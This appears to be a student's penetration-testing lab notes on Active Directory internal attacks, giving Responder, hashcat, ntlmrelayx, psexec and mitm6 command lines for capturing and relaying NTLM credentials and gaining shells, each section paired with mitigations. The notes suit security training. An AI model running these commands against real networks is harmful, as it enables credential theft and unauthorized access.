
- for impacket v 0.9.19 [reference](https://github.com/Dewalt-arch/pimpmykali)
## LLMNR Poisoning 
- For [reference](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)
- Used to identify hosts when DNS fails to do so
- Previously known as NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to   
-  `sudo responder -I eth0 -dwPv` -- this will give hash for user
- `hashcat --help | grep NTLM` -- this will give all module for NTLM in hashcat
- `hashcat -m 5600 hashes.txt /path/to/wordlist`
###### Mitigation
- To disable LLMNR and NBT-NS
	- `Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution > enable`
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is 
	- Require Network Access Control
	- Require long and complex user passwords

## SMB Relay Attacks
- For [reference](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
- Instead of cracking hashes gathered with Responder, we can instead relay hose hashes to specific machines and potentially gain access.
- Requirement:
	- SMB signing must be **disabled** or **not enforced** on the target.
	- Relayed user credentials must be admin on machine for any any real value
- By default, SMB signing is not enabled or enforced on workstations. It is enabled or enforced on servers
- `nmap --script=smb2-security-mode -p445 IP -Pn`
- SMB Relay
	- `sudo mousepad /etc/responder/Responder.conf` SMB and HTTP off
	- `sudo responder -I eth0 -dwP`
	- Now we have to set up NTML relay
		- `ntlmrelayx.py -tf targets.txt -smb2support` or 
		- `ntlmrelayx.py -tf targets.txt -smb2support -i` -- i for interactive session 
		- after getting interactive session use `nc 127.0.0.1 1100`
		- or `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` 
- In lab try it on user-2
###### Mitigation
- Enable SMB Signing on all devices
	- Pro: Completely stops the attack
	- Con: Can cause performance issues with file copies
- Disable NTLM authentication on network
	- Pro: Completely stops the attack
	- Con: if Kerberos stops working, windows defaults back to NTLM
- Account tiering
	- Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
	- Con: Enforcing the policy may be difficult
- Local admin restriction
	- Pro: Can prevent a lot of lateral movement
	- Con: Potential increase in the amount of service desk tickets

## Gaining Shell Access
- using psexec in msf  --- we can do this with password or hashes (NT:LM)
- `psexec.py marvel.local/pparker:'passw0rd@123'@10.0.2.14`
- `psexec.py administrator@10.0.2.14 -hashes [hashes for administrator NT:LM]`
- if psexec gets blocked you can use `wmiexec.py` or `smbexec.py`

## IPV6 Attacks
- `sudo mitm6 -d marvel.local`
- Now we have to set up NTLMrelay (after setup run mitm6 cmd)
	- `ntlmrelayx.py -6 -t ldaps://[Doman Controller IP] -wh fakewpad.marvel.local -l lootme` 
###### Mitigation
- IPV6 poisoning abuses the fact that Windows queries for an IPV6 address even in IPV4-only environments. If you do not use IPV6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPV6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
	- (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPV6 (DHCPv6-In)
	- (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
	- (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPV6 (DHCPv6-Out)
- If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP sigining an LDAP channel binding
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

## Passback Attack
- [Reference](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

## Initial Internal Attack Strategy
- Begin day with mitm6 or Responder
- Run scans to generate traffic
- If scans are taking too long, look for websites in scope (http_version)
- Look for default credentials on web logins
	- Printers
	- Jenkins
	- Etc
- Think outside the box